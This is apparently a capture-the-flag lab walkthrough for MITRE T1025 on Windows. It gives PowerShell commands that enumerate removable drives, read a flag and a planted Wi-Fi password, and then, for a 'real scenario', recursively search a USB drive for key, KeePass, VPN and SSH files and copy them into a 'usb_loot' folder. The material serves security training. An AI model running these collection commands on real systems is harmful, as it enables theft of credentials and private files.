# T1025 – Data from Removable Media | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1025

## Step 1 – Enumerate Connected Media
```powershell
# List all drives including removable:
Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} |
    Select-Object DeviceID, VolumeName, Size, FreeSpace
# DriveType 2 = Removable, 3 = Fixed, 5 = CD-ROM
# In our lab: C:\SimulatedUSB_Read

Get-ChildItem "C:\SimulatedUSB_Read" -Force
# flag.txt  vpn_config.ovpn  credentials.txt  backup_keys.kdbx.b64
```

## Step 2 – Run Automated Collector
```powershell
powershell -File "C:\ProgramData\collect_usb.ps1"
# Copies all files, displays sensitive content
```

## Step 3 – Read Collected Data
```powershell
Get-Content "C:\SimulatedUSB_Read\flag.txt"
# HACKTIFY{REMOVABLE_MEDIA_DATA_<hostname>}
Get-Content "C:\SimulatedUSB_Read\credentials.txt"
# WiFi_Pass=W1F1@Corp2024!
```

## Step 4 – Search for Specific File Types
```powershell
# Real scenario — search entire USB for valuable files:
Get-ChildItem "E:\" -Recurse -Include "*.pfx","*.kdbx","*.ovpn","*.key",".ssh" |
    Where-Object {$_.Length -gt 0} | Format-Table FullName, Length

# Copy only credential files:
Get-ChildItem "E:\" -Recurse -Include "*.txt","*.conf" |
    Copy-Item -Destination "C:\Users\Public\usb_loot\" -Force
```
